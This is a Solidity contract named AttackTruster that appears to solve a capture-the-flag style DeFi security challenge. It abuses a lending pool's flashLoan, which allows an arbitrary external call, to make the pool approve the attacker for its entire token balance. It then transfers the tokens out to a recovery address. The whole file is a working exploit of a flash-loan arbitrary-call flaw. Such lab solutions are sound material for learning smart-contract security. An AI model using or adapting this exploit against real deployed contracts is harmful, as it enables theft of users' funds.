// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ITrusterLenderPool {
    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data) external returns (bool);
}

contract AttackTruster {
    ITrusterLenderPool private immutable pool;
    IERC20 private immutable token;

    constructor(address _pool, address _token, address _recovery) {
        pool = ITrusterLenderPool(_pool);
        token = IERC20(_token);

        uint256 amount = token.balanceOf(address(pool));

        bytes memory data = abi.encodeCall(IERC20.approve, (address(this), amount));
        pool.flashLoan(0, address(pool), address(token), data);

        token.transferFrom(address(pool), address(this), amount);
        token.transfer(_recovery, amount);
    }
}
